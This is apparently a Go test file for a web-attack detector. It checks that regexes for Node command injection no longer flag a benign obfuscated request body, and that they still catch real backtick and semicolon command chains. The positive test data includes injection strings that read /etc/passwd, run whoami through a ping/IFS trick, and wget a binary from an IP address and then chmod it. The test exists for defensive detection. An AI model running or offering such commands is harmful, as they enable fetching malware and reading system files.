package cve

import (
	"encoding/base64"
	"strings"
	"testing"
)

// nodeCmdBacktickSampleB64 是 blazehttp 基准中的正常样本 body（.white，POST /h5/t，
// text/plain，3490 字节混淆上报串）。修复前 reNodeCmd5 在其上命中 11 次：
//   - "InSlSsypULSAUx" 含 ls、"Cwtid0ulK3" 含 id、"…pTLS=YPWEY)S*" 含 ls，
//
// 均为零边界正则的两字母子串偶发碰撞，导致整条请求被 CVE-2019-NODE-CMD 判为 drop。
// 修复后（命令词两侧加 \b）命中 0 次。base64 内嵌以便脱离 testcases 目录运行。
const nodeCmdBacktickSampleB64 = `
Q09ERUQtLXYyMGV6THZoSE89UXNPPVtRdTdfVVs7YT1bPGVBZzJoYGg3ZERLOU1vSzlXTXEzW1FXN105VzhhPWMuZFxkTGU1OzZhSVQzZ0l1K1
Q8bj5wNEN3dGlkMHVsSzNkNGg/aERnQEluU2xTc3lwVUxTQVV4X3hcVFs5XS0zLmVtM0JpZTNFTUVpek1uK3BVclNBVXdTRF0pVEdhaVc/ZTBj
PGU1azZPakw5ZUg3S1xyMHdudj9lZTg4LXYsPE15XGM8ZTVvNk9qTFtlXDovVXJTLFV3Y3hfels1YlkrPGEwPzJqNGdVSWtDbFBITzpRc3l0cX
p1MWFBRipgWF9LYTE3MmlwZ0BJa21sU25PLlZMUyxVd1M0WSkvKmlaaF5hX3Q5dnUwOWNqekdlTVAramBfcmFSYFZZV2wxbm16MSkwQF8rZWhD
YlhuNGZYSFhaTmNyYnp6KXRDaDpgWkc1cUxkPy1PVzpkRERJXkxqc1FPTFBedlBmcWhoRm5tXzhuS3Ayb084T0lITDRlXCw3VGB2LlVTUFRiel
s0XS1bPWExNzJpcGdASWtHKk1vdXBVXFMsVXdTN1kpLyphWF84YTFfS2U1OzZNVEt2TW9LOFFzeXRZYFcwWSlXRV0tMy5lbGM8ZTVjUklrcWxY
XD89aWAwLGVgRkBcKVN6X1t6NXo0bD8uUGs0VG1TalFZRypVTStyYj96Ml4pY0pdXStJZlwzMG11YERiSFhbXlxQU2lhWy9aYVtCXClfRV1YLG
NrX2xpcGBDNGJIbnVeWEhPYmBYK240eXZhQ3o6dkdHMWRBX0FqYFJETGtDeFFISFthYGRzb3p5M15lX0ZgLWNJYTA/MmlxMzZPakxyaE1YLFdy
Qi9wQHJCXCxYRHhcLDV6NCs+dU9WQ0lqeWxRWXFwV3JUenBVYDRzOS83YEh6SipATzJ1dDg4ZFQ3bWY3NitqUHYubTRXMFkpWzldLTM9ZjEzPG
U1Z09Ja3FsTW4rcFVzX3Rbdld4XFRbOmI8X01hMVsyaGBnRk9ESzlNc1wqaTs/L3A/QnhcVFs6Y2hfTWE1cD4rT1NDZDM2bFBITy9VTFNBVXhy
M3JDdjRuaFhhejRnPmU0QzZNKUdsU25Qb2tRTCxtZFx3dFgsN3YsTzxyYHM8cWJwZklHXHNeXWpza3cwO2Zldj9cRFQsbiw8aGpeczByODg5ZD
NYKmpIT3pRc1czVXcreGFDejF2MFssbUxsMSw4cDVjblNqWkxyKWJcUyxVd180WSkvKmFYXzhhMWtBZTU7NklqeWxSSU9wV3JTMFl3UzVeOVND
YmlnS2VdW0BpYV9ETUVDelFJRyxVTUswWVFPNF1VUzhhWVc8ZV1bQGlhX0RNRUN6UUlHLFVNSzBZUU80XVVTOGFZK0dlXWA2djUzRE1FQ3pRSU
csVU1LMFlRTzRdVVM4YVlXPGVdW0BpYV9ETUVDelFJRyxVTUswWVFPNF1VUzhhWVc8ZV1bQGlhX0RNRUN6UUlHcFRMUztZNFdFWSlXRV0sOy5m
XWsyazRnRUlqeWxSSVtwV3JTMVp3dUNdOXk6YT1jPWVda0BlNEM2TkVbbFNuTyxUTUt0WFBXP144W0ldLVs4ZWw/QWU0QzZORWlsU25QT2JgWC
tuNDM2XVVTO2FZWzxmQEBjLE9XO2JIV2pXXDtxVHIvLGBkR0VxaDg0bWg8ZnJxbEN1T2REWlR6W2VcOi9Vci8zWTQzeFxUW0RhWF9NYTUsTi5E
UzVkWVRyZVw7dVR2WC9VdjN4XmVXKmMsXy5kXGNMaTRnVUlrRzhRb0g7V11TMVV2M3heZV8qYyxfLmRcY0xqYGdVSW92PE1uK3BWXV90W3ZXNF
xVUzRhWF84YTFvTWU1OzZNREt2TW9bOlFzeXRZYDM1XFVXNGFoOz1kXVsyaGBnUE9ESzlNbitwVExTPVlQV0VZKVMqYFhfSWVsY1FlNV82TERL
NVFuTz1Rc0t0WFBXQV04W0ldLVcuZFxjTWpgZ1VJakt2TW9fOFFzeXRZYFcwWSl1OF0tMy5hMD8yakVjNk9qSylQSUt6VUwvMFhRTzBdZDc5XS
w7LmZBazJrOHg1YklQb1BITzpWXFNBZnpUMHNDZzRdLXlJYTE4NnV0REdaVHlsUi1pcFd2ZHNuVVwpXFRbRmNYX01yNGA8LU9zQElrZThNb3Z0
YWAwM2ZgM3hfVVMqYzBwLXphaDVoYGdTTVRLOV5yTHprO18sVXd1NlkpMC5tbDw/cmw/MmthazZPblxrZk1Uc1RMUz9adldFWSlTKmBYX0tnXG
NRZTRnQElraThNb3VwXztDdG16ZHl0VFRkdl1sM3lwTy1lNEM2T1VDbFNzWC5sYF8sVXd5NVkpMEN3MWwxZFxjUGk0Z1VkSUw0XlgrcFddW3Rb
dlhlciw0NnZIejphMD8yanFnRUlrcWxNbitwVl1bMVV3K3hyLEtDXVxcSXFwNDx1dGhAWlRLdk1yXy9Rc3l0WmBCNFlUemt1bEswekwsQ2ViU3
RJRUd6UG9HPlFPbilud2c/XzhUR2ItZzVhXmBALWREOVYzWGxXN3I3VDFfM1o0QjdeelMwZ0UsbGxuPzxlZEQ9YTNXalY3XHFpO0IpVVJcLHMs
SzVuaE49ZW1rPmlgUkRMa0NqWTdMdGFhVClYNWM3XjhGO2IsXzhhNHNNZTU8T2NvWG9QSFAvbDBTQVV3T3hcVFw7eEgzLmcwY0BlNEM2ZW9PbF
NuTyxRci90cSlbNFkpLyphWF84YTRgO2U1OzZJanlsaHJcLlFzeXRVdjN4aURfKmMsXz1hMD8ydXVfNk9qSzRSSW0sUXIvdHB6Y3hfels7YC1n
OmdcYzxlOWhCSWtxbFFuUEBUTFR4VXcsRlksX0NhPF9NYTJwQi04V0ZYSDZqTUhHbmFhW3JjelMydCxYNHhsayxjYDBLLmVgR09qOnlnNz90aW
FUd1h6WHpzRGQpeFwwL2Q0aD8scFc+Y3o7bl5zbm9ic1cubSlbRV1lLzlhPVc8ZjFrOXRkUjRJRENqXV1Xbl92Ty5welQwdGhnel9cLEcqYVxD
azRWQ2MzO3BlXVBzVHZUdm9AYHd0WCwrYDBkO3psUzotRFc4Wm9qa15vUyppd1dBWWErNV0pK0hhPWs1cGBOMGVgXzRZWVNqW3JLKmx2UCxwZG
N2W1h6Q3hdWD9nMFI/LU9XOmFZTG9QclByazxcc3BUenlcLGA3dmhPNilAUzR2OTQ1WmtPeGVzUz1VXXkxWXd1RF1VZzFsXEosYVxbMHV1bzRX
bkd4aHJMemxgX3JXVHY/dFlUO2MsTjspS1M2K3VoOUxuTG5nOFhvbFB2dVh6XDNyZEsydzxPMHI1MDF2NWtCYW9POVFZdS1Vc207WmFTLWhYRn
pdWFcscXFrMHBPaD5aWFAzUHNQc2tQQzJwUlQ0cWRTMHVdaEcpYWdRaERXR2IzXHNnclsqYXZcM3BUVD9xaF82bUdPOWRLOENoT3A6ZUhIcFEs
O3hrMXkxW3dTN19lUzlhLDB6ejBbMGVgYDVkRERTXXJ2c2E8Wy5wVFQ3cThTMHVdaEcpYWdRaERXR2IzXHNnclsqYXZcM3BUVD9xaF82bUdPOW
RLOENoT3A6ZUhIcFEsO3hrMXkxW3dTP105UzthLDB6ejBbMGVgYDVkRER5TUhudmxRXDBvNSszXERgN24wMD5ybE8ydmVsT1lZVHNdLDtxajs6
L20pWzNqWGxHbWxvP2Q0OENrNWNVTVVPKlNZbTtTXFREWFBYd3E4W0ldLWtHZ11bMmhgaDZJa3FsUVltPFVgUz1mVF9DX2UrSGNZK0tmMXQ0dj
h3RE5ES3ZNc1gsUXN5dGV6dnpZejcqdVhfTWE1PCxlOE5FWERLOVs2NnpgTFQtWXkzeF8rNHdgWzsuem1oLGU1PC9YVHpmTXI2N2BMU0FjPj4w
aFRcNWJrOy5nMzwtaGNDNmJVXGZNb3ZpYFwwblV6PkJoVFtJa0ZGOHBcZD1rY0M2T212Z1BLK3BqXXZuVXcscWhkOHZdMEY9ZV8/Mms3QDFMR3
lsZllLLWBMU0FjPj9IWXo3Km0wLy5nMGMyaGBoR0lrcnhoXCx6VExUL3BQV0VyLWg0dlg7LnFAY1FlNGdASW5HbFNuT3BUTFRzbWRfeF96W0Ri
WSs8YTA/MnU4OFVJa3I6TXJcOVFzeXRvVFQramdLLXYxaDEpMGM8ZThsUGM0VHlmXFwuUXN5dFk1TzZdVXk5YVlrLmRcZDIrdG82T2pLKVJvbT
tVMXEyWTVbNF45WzpiPV9HZm1rMmhgaEBaWDdxaExtcFdzTERYUFhBWSkvKmE8SkdkMS8yaGBoUGRESzlNbk96UXd6MnBQV0VZLTR2XTB6Lnlv
PzJrN0M2Tkd5bFBLK3BhPFh2ZFBXRWhUWzlsWF84cFxkQnZkdEdYREs5XEhPLVVdZG5VdjRyWSwwO2xYX01wXGNBaXEwMElqemZNclBzYExTQW
RQVzVdZXZ2XSw8emE0cEN0YGdVWERLKVFZampRcjBuVXpkemhUW0lsWF89ZW0sLGU0RDBJb0xuXlxcalFzem5Vd1M1XkI3KmBbOy4pS2Q5dGBn
VVhESylRWW5qUXc6dFhQWCtZKS8qXTFGVA==
`

// nodeCmdBacktickSampleBody 解码内嵌的正常样本 body。
func nodeCmdBacktickSampleBody(t *testing.T) string {
	t.Helper()
	raw, err := base64.StdEncoding.DecodeString(strings.Join(strings.Fields(nodeCmdBacktickSampleB64), ""))
	if err != nil {
		t.Fatalf("样本 base64 解码失败: %v", err)
	}
	return string(raw)
}

// TestNodeCmd5BacktickWordBoundaryRejectsIncidentalSubstrings 锁定反引号命令替换
// 正则的命令词边界要求：混淆串中偶然出现的两字母子串不再命中。
func TestNodeCmd5BacktickWordBoundaryRejectsIncidentalSubstrings(t *testing.T) {
	body := nodeCmdBacktickSampleBody(t)
	if n := len(reNodeCmd5.FindAllString(body, -1)); n != 0 {
		t.Errorf("reNodeCmd5 在正常样本 body 上命中 %d 次，应为 0；命中片段=%v",
			n, reNodeCmd5.FindAllString(body, -1))
	}
	// 直接构造最小碰撞形态：命令词前后均为字母，词边界不成立。
	for _, s := range []string{
		"`InSlSsypULSAUx`", // 含 "ls"
		"`Cwtid0ulK3`",     // 含 "id"
		"`gPODK9Mn+pTLS=YPWEY)S*`",
		"`ULSAUx`",
	} {
		if reNodeCmd5.MatchString(s) {
			t.Errorf("reNodeCmd5 不应命中零边界偶然子串 %q", s)
		}
	}
}

// TestNodeCmd5BacktickStillDetectsRealSubstitution 锁定真实反引号命令替换仍然命中：
// 词边界不得削弱 `ls`、`whoami`、`cat /etc/passwd`、`id` 等真实形态。
func TestNodeCmd5BacktickStillDetectsRealSubstitution(t *testing.T) {
	real := []string{
		"x=`ls`",
		"cmd=`ls -la`",
		"`whoami`",
		"doAs=`id`",
		"file=`cat /etc/passwd`",
		"file=`cat/etc/passwd`",
		"`uname -a`",
		"a=`pwd`",
		"login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
		"`echo x`; `id`; `uname -a`",
		"`id\nwhoami`",
	}
	for _, s := range real {
		if !reNodeCmd5.MatchString(s) {
			t.Errorf("reNodeCmd5 漏掉真实反引号命令替换 %q", s)
		}
	}
}

// TestNodeCmd3RequiresCommandTerminator 锁定分号命令正则的命令终止符要求：
// 命令词后必须是空白/shell 分隔符/串尾，URL 参数形态 ";cat=wac-v0" 不再命中。
func TestNodeCmd3RequiresCommandTerminator(t *testing.T) {
	negatives := []string{
		"/activityi;src=5406241;type=global;cat=wac-v0;ord=1;num=3488505019090;gtm=45He36s0;",
		"a=1;id=123",
	}
	for _, s := range negatives {
		if reNodeCmd3.MatchString(s) {
			t.Errorf("reNodeCmd3 不应命中 URL 参数形态 %q", s)
		}
	}
	positives := []string{
		"; id",
		";ID",
		";ls -la",
		"cmd=cd /tmp;wget http://47.108.71.52/Linux2.6;chmod 777 x",
		";whoami",
	}
	for _, s := range positives {
		if !reNodeCmd3.MatchString(s) {
			t.Errorf("reNodeCmd3 漏掉真实分号命令链 %q", s)
		}
	}
}

// TestNodeCmdDetectorNoDropOnBenignBacktickSample 端到端锁定：正常样本经完整
// CVE 检测器不再产生任何 NODE-CMD 命中（修复前该样本被 drop）。
func TestNodeCmdDetectorNoDropOnBenignBacktickSample(t *testing.T) {
	body := nodeCmdBacktickSampleBody(t)
	if len(body) != 3490 {
		t.Fatalf("样本 body 长度漂移: got %d want 3490", len(body))
	}
	req := BuildCVERequest("/h5/t", "", map[string]string{
		"Host":         "sofire.baidu.com",
		"Content-Type": "text/plain",
	}, []byte(body), "text/plain")

	d := NewNodeCVEDetector()
	hits := computeSubDetectorHits(req)
	if m, ok := d.DetectFirst(req, &hits); ok {
		t.Errorf("正常反引号样本仍被 NodeCVEDetector 命中: cve=%s pattern=%q part=%s", m.CVEID, m.Pattern, m.MatchedPart)
	}
}
